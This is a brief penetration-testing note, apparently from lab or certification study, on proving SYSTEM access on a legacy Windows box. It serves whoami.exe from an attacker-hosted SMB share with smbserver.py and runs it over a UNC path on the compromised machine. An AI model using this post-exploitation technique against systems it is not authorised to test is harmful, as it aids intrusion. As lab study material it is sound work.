# Whoami - Legacy Windows Machine

If unable to prove that you are SYSTEM on a Windows machine use the following approach:

On the Attack Machine
```
root@kali# smbserver.py a /usr/share/windows-binaries/ (on your local Kali machine)
```
On the Target Machine

```
C:\WINDOWS\system32> \\10.11.0.x\a\whoami.exe (on the compromised Windows machine)
NT AUTHORITY\SYSTEM
```

Now you are able to prove you have successfully owned the box and show you are SYSTEM.
